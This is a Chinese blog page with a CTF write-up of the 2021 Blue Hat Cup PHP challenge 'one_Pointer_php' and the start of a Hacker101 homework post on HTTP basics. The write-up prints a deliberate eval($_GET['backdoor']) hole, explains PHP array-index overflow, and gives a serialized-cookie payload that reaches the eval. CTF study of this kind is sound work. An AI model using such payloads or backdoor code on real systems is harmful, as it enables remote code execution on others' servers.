<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>inanb</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="inanb"><meta name="msapplication-TileImage" content="img/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="inanb"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥"><meta property="og:type" content="blog"><meta property="og:title" content="inanb"><meta property="og:url" content="https://removeif.github.io/"><meta property="og:site_name" content="inanb"><meta property="og:description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><meta property="article:author" content="removeif"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"inanb","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"inanb"},"description":"é“é©¬å†°æ²³å…¥æ¢¦æ¥"}</script><link rel="icon" href="/img/favicon.ico"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="inanb" type="application/atom+xml">
</head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">é¦–é¡µ</a><a class="navbar-item" href="/archives">å½’æ¡£</a><a class="navbar-item" href="/categories">åˆ†ç±»</a><a class="navbar-item" href="/tags">æ ‡ç­¾</a><a class="navbar-item" href="/music">éŸ³è‰²</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item search" title="æœç´¢" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-5-tablet is-9-desktop is-7-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-05-08Â Â <a class="commentCountImg" href="/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/#comment-container"><span class="display-none-class">/2021/05/08/è“å¸½æ¯2021å¤ç°/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="755fe1ad916c0e252dfab1894b6b7c0a">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>5 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>0.8Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/">è“å¸½æ¯2021å¤ç°</a></h1><div class="content"><h3><span id="è“å¸½æ¯2021å¤ç°">è“å¸½æ¯2021å¤ç°</span></h3><h4><span id="one_pointer_php">one_Pointer_php</span></h4><p>buuä¸Šå¼€äº†ç¯å¢ƒï¼ŒçœŸä¸é”™</p>
<p>user.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>add_api.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">		$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$user=<span class="keyword">new</span> User;</span><br><span class="line">	$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°±ä¸¤ä¸ªæ–‡ä»¶â€¦â€¦</p>
<p>å½“æ—¶çœ‹äº†åŠå¤©ï¼Œå°±åªçŸ¥é“è¦ç»•è¿‡<code>if($count[]=1)</code>â€¦â€¦å¯è¿™ç©æ„ä¸æ˜¯æ’å¯¹çš„å—â€¦â€¦</p>
<p>è¿™å…³ç³»åˆ°phpçš„ç´¢å¼•æ•°ç»„æº¢å‡º</p>
<h5><span id="phpæ•°ç»„">PHPæ•°ç»„</span></h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43821278/article/details/114763459">https://blog.csdn.net/weixin_43821278/article/details/114763459</a></p>
<p>æ ¹æ®è¿™ç¯‡æ–‡ç« çš„å®éªŒ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php 5.59nts</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a[<span class="number">2147483647</span>]=<span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">$a[]=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºï¼š</p>
<p><img src="D:\HexoBlog\source\images\è“å¸½æ¯2021å¤ç°\image-20210508181911478.png" alt="image-20210508181911478"></p>
<blockquote>
<p>$a[]è®¿é—®åˆ°çš„æ˜¯å½“å‰æœ€å¤§æ•°å€¼ç´¢å¼•çš„ä¸‹ä¸€ä½</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨5.5.9ntsç‰ˆæœ¬ä¸‹ï¼Œ2147483647å°±æ˜¯æ•°å€¼ç´¢å¼•çš„ç•Œé™ï¼Œè€Œ2147483647æ­£æ˜¯5.5.9ç‰ˆæœ¬ä¸­é»˜è®¤è®¾ç½®çš„æ•´å‹æœ€å¤§å€¼ï¼š<code>PHP_INT_MAX:int(2147483647)</code>ã€‚</p>
<p>è¿™é‡Œçš„intï¼Œæ˜¯<strong>æœ‰ç¬¦å·32ä½äºŒè¿›åˆ¶å¯è¡¨ç¤ºçš„æœ€å¤§æ•°</strong>ã€‚</p>
<blockquote>
<p><strong>2^31-1</strong>=<strong>2147483647</strong></p>
</blockquote>
<p>å¦‚æœè¶…è¿‡äº†å‘¢ï¼Ÿ</p>
<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165829865.png" alt="image-20210513165829865"></p>
<p>è¿™é‡Œä¼šè½¬åŒ–ä¸ºèŒƒå›´æ›´å¤§çš„floatå‚¨å­˜â€¦â€¦</p>
<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165839374.png" alt="image-20210513165839374"></p>
<p>æ•°ç»„ä¸­æº¢å‡ºåå°±ä¼šå›æ»šä»intçš„æœ€å°å€¼ï¼Œäºæ˜¯ä¼šç¬¦åˆè¿™æ ·çš„è§„å¾‹ï¼š</p>
<blockquote>
<p>0â€”2147483647                       ä¸‹æ ‡0~2147483647 </p>
<p>2147483648â€”4294967296   ä¸‹æ ‡-2147483648~0 </p>
<p>4294967296â€”6442450943   ä¸‹æ ‡ 0~2147483647</p>
<p>ä¸‹ä¸€ä¸ªæº¢å‡ºä¸º0çš„æ•°å­—æ˜¯ï¼š8589934592</p>
</blockquote>
<p>è¿™æ ·ä½¿ç”¨ä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœæ˜¯é€šè¿‡<code>$a[]</code>å»è·å–å°±ä¼šäº§ç”ŸæŠ¥é”™ï¼Œç›¸å…³ç‰ˆæœ¬çš„é¢˜ç›®æ˜¯<code>XCTF-favorite_number</code>ï¼Œå¯ä»¥ç ”ç©¶ç ”ç©¶ã€‚</p>
<h5><span id="è¾ƒæ–°çš„ç‰ˆæœ¬">è¾ƒæ–°çš„ç‰ˆæœ¬</span></h5><p>è¿™é‡Œæ˜¯7.3.4ntsçš„phpç‰ˆæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MAXï¼š&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MAX);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MINï¼š&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MIN);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_SIZEï¼š&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_SIZE);</span><br><span class="line"></span><br><span class="line">$a =<span class="number">9223372036854775806</span>;</span><br><span class="line">$b =<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_intï¼š&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_floatï¼š&quot;</span>;</span><br><span class="line">var_dump(is_float($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºï¼š</span><br><span class="line">PHP_INT_MAXï¼šint(9223372036854775807)</span><br><span class="line">PHP_INT_MINï¼šint(-9223372036854775808)</span><br><span class="line">PHP_INT_SIZEï¼šint(8)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">is_intï¼šbool(false)</span><br><span class="line">is_floatï¼šbool(true)</span><br><span class="line">9223372036854775806</span><br><span class="line">9223372036854775807</span><br><span class="line">9.2233720368548E+18</span><br></pre></td></tr></table></figure>

<p>åŒæ ·ä¼šè½¬åŒ–ä¸ºfloatè€Œä¸å†å±äºæ•´å‹ï¼Œå¹¶ä¼šä»¥ç§‘å­¦è®¡æ•°æ³•è¾“å‡º</p>
<p>è¿™é‡Œçš„â€œintâ€ï¼Œæ˜¯<strong>æœ‰ç¬¦å·64ä½äºŒè¿›åˆ¶å¯è¡¨ç¤ºçš„æœ€å¤§æ•°</strong>ï¼Œæˆ–è€…è¯´ï¼Œæˆ‘ä»¬æ›´åŠ ç†Ÿæ‚‰çš„<strong>long long int</strong>ã€‚</p>
<blockquote>
<p><strong>2^63-1</strong>=<strong>9223372036854775807</strong></p>
</blockquote>
<p>è¾ƒæ–°çš„ç‰ˆæœ¬å¤§æ¦‚æ˜¯æé«˜äº†ç´¢å¼•æº¢å‡ºçš„é˜ˆå€¼â€¦â€¦</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a[<span class="number">9223372036854775806</span>]=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165907924.png" alt="image-20210513165907924"></p>
<p>æœ€åçš„è¯­å¥æˆåŠŸæŠ¥é”™ï¼Œæ ¹æ®è¿™ä¸ªæ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">		$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$user=<span class="keyword">new</span> User;</span><br><span class="line">	$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a =<span class="keyword">new</span> User();</span><br><span class="line">$a -&gt;count=<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line">$a =urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥æˆåŠŸç»•è¿‡èµ‹å€¼åˆ¤æ–­</p>
<blockquote>
<p>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</p>
</blockquote>
<p>æ‰§è¡Œå‘½ä»¤ï¼Œæ¥phpinfoçœ‹çœ‹æ•æ„Ÿä¿¡æ¯ï¼š</p>
<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165922744.png" alt="image-20210513165922744"></p>
<p>â€¦â€¦ä¸Šä¸€ä¸ªç»•è¿‡<strong>disable_function</strong>çš„è¿˜æ˜¯soåŠ«æŒæˆ–è€…èšå‰‘æ’ä»¶â€¦â€¦ä¸æ˜¯å¾ˆä¼šâ€¦â€¦</p>
<p>çœ‹äº†dalaoçš„wpï¼Œä¸€ç›´æä¸å¥½â€¦â€¦åŸç†å€’æ˜¯çœ‹äº†ä¸ƒä¸ƒå…«å…«â€¦â€¦</p>
<p>ç„¶åâ€¦â€¦æ²¡æœ‰ç„¶åäº†â€¦â€¦è¹²ä¸€ä¸ªå¥½å¤§ä½¬çš„wpğŸ˜¢</p>
</div><div class="index-category-tag">Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-05-06Â Â <a class="commentCountImg" href="/2021/05/06/hacker101-2/#comment-container"><span class="display-none-class">/2021/05/06/hacker101-2/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="b4a2d8edb25d60b074bf25105944a3a7">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>13 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>2.0Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/06/hacker101-2/">hacker101-2</a></h1><div class="content"><h5><span id="hacker1012">hacker101.2</span></h5><p>ä¸­æ–‡è§†é¢‘ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1MJ411D75M?from=search&seid=11355973279630099592">ã€FreeBufå­—å¹•ç»„ã€‘Hacker101ç™½å¸½é»‘å®¢è¿›é˜¶ä¹‹è·¯-Webå·¥ä½œæœºåˆ¶</a></p>
<p>1.httpæŠ¥æ–‡çš„ç»“æ„æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ1åˆ†ï¼‰ </p>
<blockquote>
<p>ä¸€ä¸ªHTTPè¯·æ±‚æŠ¥æ–‡ç”±è¯·æ±‚è¡Œï¼ˆrequest lineï¼‰ã€è¯·æ±‚å¤´éƒ¨ï¼ˆrequest headerï¼‰ã€ç©ºè¡Œå’Œè¯·æ±‚æ•°æ®4ä¸ªéƒ¨åˆ†æ„æˆã€‚</p>
<p><strong>è¯·æ±‚è¡Œ</strong>æ•°æ®æ ¼å¼ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼šè¯·æ±‚æ–¹æ³•ã€URIã€HTTPåè®®ç‰ˆæœ¬ï¼Œä»–ä»¬ä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ã€‚                                                     </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1 					#è¯·æ±‚æ–¹æ³•ä¸ºGETï¼Œè¯·æ±‚è·¯å¾„ä¸ºæ ¹ç›®å½•ï¼Œ1.1ç‰ˆæœ¬</span><br></pre></td></tr></table></figure>

<p><strong>è¯·æ±‚å¤´éƒ¨</strong>ç´§è·Ÿç€è¯·æ±‚è¡Œï¼Œè¯¥éƒ¨åˆ†ä¸»è¦æ˜¯ç”¨äºæè¿°è¯·æ±‚æ­£æ–‡                                                                           </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Host: hackerone.com                                                       Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.121 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close		##ä¸»è¦æ˜¯ç”¨äºè¯´æ˜è¯·æ±‚æºã€è¿æ¥ç±»å‹ã€Cookieä¿¡æ¯ã€å¯å¤„ç†å†…å®¹ç­‰</span><br></pre></td></tr></table></figure>

<p><strong>è¯·æ±‚æ­£æ–‡</strong>å’Œè¯·æ±‚å¤´éƒ¨é€šè¿‡ä¸€ä¸ªç©ºè¡Œè¿›è¡Œéš”å¼€ï¼Œä¸€èˆ¬ç”¨äºå­˜æ”¾POSTè¯·æ±‚ç±»å‹çš„è¯·æ±‚æ­£æ–‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin</span><br></pre></td></tr></table></figure>
</blockquote>
<p>2.ä»€ä¹ˆæ˜¯crlfï¼Ÿåœ¨httpæŠ¥æ–‡çš„å“ªä¸ªä½ç½®ã€‚ï¼ˆ1åˆ†ï¼‰ </p>
<blockquote>
<table>
<thead>
<tr>
<th><strong>ç¼©å†™</strong></th>
<th><strong>ASCâ…¡è½¬ä¹‰</strong></th>
<th><strong>ç³»ç»Ÿ</strong></th>
<th><strong>ASCâ…¡å€¼</strong></th>
</tr>
</thead>
<tbody><tr>
<td>CR</td>
<td>\r</td>
<td>MacIntoshï¼ˆæ—©æœŸçš„Macï¼‰</td>
<td>13</td>
</tr>
<tr>
<td>LF</td>
<td>\n</td>
<td>Unix/Linux/Mac OS X</td>
<td>10</td>
</tr>
<tr>
<td>CR LF</td>
<td>\r\n</td>
<td>Windows</td>
<td></td>
</tr>
</tbody></table>
<p>CRï¼šCarriage Returnï¼Œå¯¹åº”ASCIIä¸­è½¬ä¹‰å­—ç¬¦\rï¼Œè¡¨ç¤ºå›è½¦</p>
<p>LFï¼šLinefeedï¼Œå¯¹åº”ASCIIä¸­è½¬ä¹‰å­—ç¬¦\nï¼Œè¡¨ç¤ºæ¢è¡Œ</p>
<p>CRLFï¼šCarriage Return &amp; Linefeedï¼Œ\r\nï¼Œè¡¨ç¤ºå›è½¦å¹¶æ¢è¡Œ</p>
<p>Windowsæ“ä½œç³»ç»Ÿé‡‡ç”¨ä¸¤ä¸ªå­—ç¬¦æ¥è¿›è¡Œæ¢è¡Œï¼Œå³CRLFï¼›</p>
<p>Unix/Linux/Mac OS Xæ“ä½œç³»ç»Ÿé‡‡ç”¨å•ä¸ªå­—ç¬¦LFæ¥è¿›è¡Œæ¢è¡Œï¼›</p>
<p>MacIntoshæ“ä½œç³»ç»Ÿï¼ˆå³æ—©æœŸçš„Macæ“ä½œç³»ç»Ÿï¼‰é‡‡ç”¨å•ä¸ªå­—ç¬¦CRæ¥è¿›è¡Œæ¢è¡Œã€‚</p>
<hr>
<p><strong>Burp</strong>ä¸­ï¼Œç‚¹å‡»\nå³å¯çœ‹åˆ°æŠ¥æ–‡ä¸­crlfçš„è¯¦ç»†ä½ç½®ï¼Œæ®æˆ‘ç›®å‰çš„ç»éªŒï¼Œcrlfå¯ç”¨äºcsrfå’Œhttpèµ°ç§</p>
<p>â€¦â€¦</p>
</blockquote>
<p>3.è§£é‡Šä¸‹è¿™å‡ ä¸ªå¤´çš„å«ä¹‰ï¼ˆ5åˆ†ï¼‰ï¼š </p>
<img src="/images/week4/image-20210506102725317.png" alt="image-20210506102725317" style="zoom:80%;">

<blockquote>
<p>headå¤´ï¼š</p>
<p>Hostï¼šè¡¨æ˜è¯·æ±‚å°†è¦å‘é€è‡³çš„å®é™…ä¸»æœº</p>
<p>Acceptï¼šå®¢æˆ·ç«¯æµè§ˆå™¨å¯å¤„ç†çš„MIMEç±»å‹ï¼Œè®¾ç½®ç”¨æ¥æŒ‡å®šå“åº”ç±»å‹</p>
<p>Cookieï¼šåŒ…å«å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ é€’çš„cookieæ•°æ®</p>
<p>Refererï¼šè¡¨æ˜è¯·æ±‚å…·ä½“æ¥æºäºå“ªä¸ªé¡µé¢çš„é“¾æ¥</p>
<p>Authorizationï¼šé€šå¸¸ç”¨æ¥åšä¸€äº›tokenè®¤è¯</p>
</blockquote>
<p>4.cookieå…·æœ‰å“ªäº›ç‰¹ç‚¹ï¼Œä¸åŒçš„åŸŸåå’Œå­åŸŸåå¯¹cookieæœ‰æ€æ ·çš„æƒé™ï¼ŸCookieçš„Secureå’Œ HTTPOnlyè¿™ä¸¤ä¸ªflagåˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿè¯·ç»“åˆxssæ”»å‡»æ¥è¿›è¡Œè¯´æ˜ï¼ˆ3åˆ†ï¼‰ </p>
<blockquote>
<p>è‹¥Set-CookieæŒ‡å®šDomainä¸ºxxx.comï¼Œé‚£ä¹ˆxxx.comçš„å­åŸŸååŒæ ·èƒ½å¤Ÿè®¿é—®è·å–åˆ°è¿™ä¸ªCookieã€‚è‹¥æŒ‡å®šDomainä¸ºæŸå­åŸŸå(sub.xxx.com)ï¼Œé‚£ä¹ˆåªæœ‰è¯¥å­åŸŸååŠå…¶ä¸‹çº§å­åŸŸåæ‰å¯ä»¥è®¿é—®è·å¾—Cookieã€‚</p>
<p>Cookieçš„Secureå±æ€§ï¼šè¿™ä»£è¡¨Cookieåªèƒ½åœ¨HTTPSåè®®ä¸­ä¼ è¾“</p>
